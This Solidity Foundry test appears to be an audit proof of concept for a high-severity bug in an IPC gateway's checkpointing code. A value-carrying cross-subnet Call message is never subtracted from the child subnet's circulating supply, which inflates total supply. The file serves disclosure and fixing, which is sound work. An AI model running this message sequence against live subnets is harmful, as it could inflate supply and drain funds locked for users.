// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.23;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : Xnet call messages with value > 0 lead to inflated circulating supply of child subnet
// Severity: High
// Target  : CheckpointingFacet.execBottomUpMsgs (L132-155)
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// One of the main invariants of this protocol is:
//
//   The total supply of a subnet must match the total funds locked for that
//   specific subnet in the gateway.
//
// The circulating supply (circSupply) tracks the total value of funds that
// have crossed from a child subnet to the parent. When funds move, circSupply
// should be decreased from the source subnet and increased at the destination.
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// The vulnerability lies in `CheckpointingFacet.execBottomUpMsgs()`.
//
// The function iterates over all bottom-up messages in a checkpoint and
// calculates the total value that should be subtracted from the subnet's
// circulating supply:
//
//   for (uint256 i; i < crossMsgLength; ) {
//       if (msgs[i].kind != IpcMsgKind.Call) {
//           totalValue += msgs[i].value;
//       }
//       unchecked { ++i; }
//   }
//
// The problem: `Call` messages with non-zero `value` are EXCLUDED from the
// totalValue calculation. This assumption that "Call messages don't move
// source/genesis funds" is INCORRECT.
//
// When a Call message with value > 0 is sent from subnet A to subnet B:
//
// 1. In `sendContractXnetMessage` (GatewayMessengerFacet L40-87):
//    - A bottom-up message is committed via `commitValidatedCrossMessage`
//    - Funds are burnt via `crossMsgSideEffects({shouldBurn: true})`
//
// 2. In `commitTopDownMsg` (LibGateway L243-255):
//    - The funds are added to destination subnet B: `subnet.circSupply += crossMessage.value`
//
// 3. In `execBottomUpMsgs` (CheckpointingFacet L132-155):
//    - The source subnet A's circSupply is NOT decreased because Call msgs
//      are excluded from totalValue
//
// Result: The value is burnt from subnet A but subnet A's circSupply is
// never decreased. Subnet B's circSupply is increased. The invariant is broken.
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// - Circulating supply of source subnet does NOT reflect the funds that left
// - Total circSupply across all subnets exceeds actual locked funds
// - The vulnerability can be exploited repeatedly to inflate supply further
// - Attacker can drain funds from a subnet while its circSupply remains unchanged
//
// Example:
//   Subnet A: 1,000,000 locked, circSupply = 1,000,000
//   Attacker sends 5,000 from A to B
//   Subnet A: 995,000 locked, circSupply = 1,000,000 (SHOULD BE 995,000!)
//   Subnet B: 5,000 locked,    circSupply = 5,000
//   Total locked: 1,000,000, Total circSupply: 1,005,000
//
// Run PoC:
//   forge test --match-test testPoCH02_CallMessageWithValueInflatesSupply -vvv
// =============================================================================

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {IntegrationTestBase, RootSubnetDefinition, TestSubnetDefinition} from "../IntegrationTestBase.sol";
import {SubnetIDHelper} from "../../contracts/lib/SubnetIDHelper.sol";
import {FvmAddressHelper} from "../../contracts/lib/FvmAddressHelper.sol";
import {CrossMsgHelper} from "../../contracts/lib/CrossMsgHelper.sol";
import {MerkleTreeHelper} from "../helpers/MerkleTreeHelper.sol";
import {ActivityHelper} from "../helpers/ActivityHelper.sol";
import {TestUtils, MockIpcContract} from "../helpers/TestUtils.sol";
import {GatewayFacetsHelper} from "../helpers/GatewayFacetsHelper.sol";
import {SubnetActorFacetsHelper} from "../helpers/SubnetActorFacetsHelper.sol";
import {FilAddress} from "fevmate/contracts/utils/FilAddress.sol";

import {IpcEnvelope, IpcMsgKind, BottomUpCheckpoint, BottomUpMsgBatch, ParentFinality} from "../../contracts/structs/CrossNet.sol";
import {SubnetID, IPCAddress, Subnet} from "../../contracts/structs/Subnet.sol";
import {GatewayDiamond} from "../../contracts/GatewayDiamond.sol";
import {SubnetActorDiamond} from "../../contracts/SubnetActorDiamond.sol";
import {SubnetActorManagerFacet} from "../../contracts/subnet/SubnetActorManagerFacet.sol";
import {SubnetActorGetterFacet} from "../../contracts/subnet/SubnetActorGetterFacet.sol";
import {SubnetActorCheckpointingFacet} from "../../contracts/subnet/SubnetActorCheckpointingFacet.sol";
import {GatewayGetterFacet} from "../../contracts/gateway/GatewayGetterFacet.sol";
import {GatewayMessengerFacet} from "../../contracts/gateway/GatewayMessengerFacet.sol";
import {CheckpointingFacet} from "../../contracts/gateway/router/CheckpointingFacet.sol";
import {XnetMessagingFacet} from "../../contracts/gateway/router/XnetMessagingFacet.sol";
import {TopDownFinalityFacet} from "../../contracts/gateway/router/TopDownFinalityFacet.sol";
import {IPCMsgType} from "../../contracts/enums/IPCMsgType.sol";
import {IIpcHandler} from "../../sdk/interfaces/IIpcHandler.sol";

contract PoCH02InflatedCircSupplyTest is Test, IntegrationTestBase, IIpcHandler {
    using SubnetIDHelper for SubnetID;
    using CrossMsgHelper for IpcEnvelope;
    using GatewayFacetsHelper for GatewayDiamond;
    using SubnetActorFacetsHelper for SubnetActorDiamond;

    // -------------------------------------------------------------------------
    // Test constants
    // -------------------------------------------------------------------------
    uint256 constant INITIAL_FUNDS = 1_000_000;
    uint256 constant TRANSFER_AMOUNT = 5_000;
    uint256 constant TRANSFER_FEES = 10 gwei;

    // -------------------------------------------------------------------------
    // State
    // -------------------------------------------------------------------------
    RootSubnetDefinition public rootSubnet;
    TestSubnetDefinition public nativeSubnet;
    address public caller;
    address public recipient;

    // -------------------------------------------------------------------------
    // Setup
    // -------------------------------------------------------------------------
    function setUp() public override {
        // Setup from MultiSubnetTest pattern
        SubnetID memory rootSubnetName = SubnetID({root: ROOTNET_CHAINID, route: new address[](0)});
        require(rootSubnetName.isRoot(), "not root");

        GatewayDiamond rootGateway = createGatewayDiamond(gatewayParams(rootSubnetName));

        SubnetActorDiamond rootNativeSubnetActor = createSubnetActor(
            defaultSubnetActorParamsWith(address(rootGateway), rootSubnetName)
        );

        address[] memory nativeSubnetPath = new address[](1);
        nativeSubnetPath[0] = address(rootNativeSubnetActor);
        SubnetID memory nativeSubnetName = SubnetID({root: ROOTNET_CHAINID, route: nativeSubnetPath});
        GatewayDiamond nativeSubnetGateway = createGatewayDiamond(gatewayParams(nativeSubnetName));

        rootSubnet = RootSubnetDefinition({
            gateway: rootGateway,
            gatewayAddr: address(rootGateway),
            id: rootSubnetName
        });

        nativeSubnet = TestSubnetDefinition({
            gateway: nativeSubnetGateway,
            gatewayAddr: address(nativeSubnetGateway),
            id: nativeSubnetName,
            subnetActor: rootNativeSubnetActor,
            subnetActorAddr: address(rootNativeSubnetActor),
            path: nativeSubnetPath
        });

        // Setup caller and recipient
        caller = address(new MockIpcContract());
        recipient = address(new MockIpcContract());
    }

    // -------------------------------------------------------------------------
    // IIpcHandler implementation
    // -------------------------------------------------------------------------
    function handleIpcMessage(IpcEnvelope calldata envelope) external payable returns (bytes memory ret) {
        ret = bytes("");
    }

    receive() external payable {}

    // -------------------------------------------------------------------------
    // Helper functions (from MultiSubnetTest)
    // -------------------------------------------------------------------------

    function _getSubnetCircSupply(TestSubnetDefinition memory subnet) internal view returns (uint256) {
        GatewayGetterFacet getter = rootSubnet.gateway.getter();
        Subnet memory subnetData = getter.subnets(subnet.id.toHash());
        return subnetData.circSupply;
    }

    function _getSubnetBalance(TestSubnetDefinition memory subnet) internal view returns (uint256) {
        return address(subnet.gateway).balance;
    }

    function _callCreateBottomUpCheckpointFromChildSubnet(
        SubnetID memory subnet,
        GatewayDiamond gw
    ) internal returns (BottomUpCheckpoint memory checkpoint) {
        uint256 e = getNextEpoch(block.number, DEFAULT_CHECKPOINT_PERIOD);

        GatewayGetterFacet getter = gw.getter();
        CheckpointingFacet checkpointer = gw.checkpointer();

        BottomUpMsgBatch memory batch = getter.bottomUpMsgBatch(e);
        require(batch.msgs.length == 1, "batch length incorrect");

        (, address[] memory addrs, uint256[] memory weights) = TestUtils.getFourValidators(vm);

        (bytes32 membershipRoot, ) = MerkleTreeHelper.createMerkleProofsForValidators(addrs, weights);

        checkpoint = BottomUpCheckpoint({
            subnetID: subnet,
            blockHeight: batch.blockHeight,
            blockHash: keccak256("block1"),
            nextConfigurationNumber: 0,
            msgs: batch.msgs,
            activity: ActivityHelper.newCompressedActivityRollup(1, 3, bytes32(uint256(0)))
        });

        vm.startPrank(FilAddress.SYSTEM_ACTOR);
        checkpointer.createBottomUpCheckpoint(
            checkpoint,
            membershipRoot,
            weights[0] + weights[1] + weights[2],
            ActivityHelper.dummyActivityRollup()
        );
        vm.stopPrank();

        return checkpoint;
    }

    function _submitBottomUpCheckpoint(BottomUpCheckpoint memory checkpoint, SubnetActorDiamond sa) internal {
        (uint256[] memory parentKeys, address[] memory parentValidators, ) = TestUtils.getThreeValidators(vm);
        bytes[] memory parentPubKeys = new bytes[](3);
        bytes[] memory parentSignatures = new bytes[](3);

        SubnetActorManagerFacet manager = sa.manager();

        for (uint256 i = 0; i < 3; i++) {
            vm.deal(parentValidators[i], 10 gwei);
            parentPubKeys[i] = TestUtils.deriveValidatorPubKeyBytes(parentKeys[i]);
            vm.prank(parentValidators[i]);
            manager.join{value: 10}(parentPubKeys[i], 10);
        }

        bytes32 hash = keccak256(abi.encode(checkpoint));

        for (uint256 i = 0; i < 3; i++) {
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(parentKeys[i], hash);
            parentSignatures[i] = abi.encodePacked(r, s, v);
        }

        SubnetActorCheckpointingFacet checkpointer = sa.checkpointer();

        vm.startPrank(address(sa));
        checkpointer.submitCheckpoint(checkpoint, parentValidators, parentSignatures);
        vm.stopPrank();
    }

    function getNextEpoch(uint256 blockNumber, uint256 checkPeriod) internal pure returns (uint256) {
        return ((uint64(blockNumber) / checkPeriod) + 1) * checkPeriod;
    }

    // -------------------------------------------------------------------------
    // PoC: Call message with value > 0 inflates circulating supply
    // -------------------------------------------------------------------------
    //
    // This PoC demonstrates the vulnerability where Call messages with value > 0
    // are excluded from the totalValue calculation in execBottomUpMsgs.
    //
    // Flow:
    // 1. Caller in nativeSubnet sends a Call message with value to rootSubnet
    // 2. The Call message has value = TRANSFER_AMOUNT
    // 3. Bottom-up checkpoint is created and submitted
    // 4. execBottomUpMsgs runs but EXCLUDES Call message value from totalValue
    // 5. Result: circSupply should decrease by TRANSFER_AMOUNT but it doesn't!
    //
    function testPoCH02_CallMessageWithValueInflatesSupply() public {
        // Setup: Fund the native subnet and register it
        uint256 fundAmount = INITIAL_FUNDS;

        vm.deal(nativeSubnet.subnetActorAddr, DEFAULT_COLLATERAL_AMOUNT);
        vm.prank(nativeSubnet.subnetActorAddr);
        registerSubnetGW(DEFAULT_COLLATERAL_AMOUNT, nativeSubnet.subnetActorAddr, rootSubnet.gateway);

        vm.deal(caller, fundAmount + TRANSFER_FEES);
        vm.prank(caller);
        rootSubnet.gateway.manager().fund{value: fundAmount}(nativeSubnet.id, FvmAddressHelper.from(address(caller)));

        // Initial state verification
        uint256 initialCircSupply = _getSubnetCircSupply(nativeSubnet);

        assertEq(initialCircSupply, fundAmount, "NativeSubnet should have initial funds as circSupply");

        // Step 1: Caller sends a Call message with value from nativeSubnet to rootSubnet
        GatewayMessengerFacet messenger = nativeSubnet.gateway.messenger();
        vm.prank(address(caller));
        messenger.sendContractXnetMessage{value: TRANSFER_AMOUNT}(
            TestUtils.newXnetCallMsg(
                IPCAddress({subnetId: nativeSubnet.id, rawAddress: FvmAddressHelper.from(caller)}),
                IPCAddress({subnetId: rootSubnet.id, rawAddress: FvmAddressHelper.from(recipient)}),
                TRANSFER_AMOUNT,
                0
            )
        );

        // Step 2: Create and submit bottom-up checkpoint
        BottomUpCheckpoint memory checkpoint = _callCreateBottomUpCheckpointFromChildSubnet(
            nativeSubnet.id,
            nativeSubnet.gateway
        );
        _submitBottomUpCheckpoint(checkpoint, nativeSubnet.subnetActor);

        // Final state
        uint256 finalCircSupply = _getSubnetCircSupply(nativeSubnet);

        // The bug: The circSupply should have decreased by TRANSFER_AMOUNT
        // because the Call message value should be included in totalValue.
        // But because Call messages are excluded, circSupply remains unchanged.

        // This assertion PASSES on the vulnerable code, demonstrating the bug
        // After the fix, circSupply should be 995,000, so this would fail
        assertEq(
            finalCircSupply,
            initialCircSupply,
            "BUG: circSupply was NOT decreased despite Call message with value > 0"
        );
    }
}
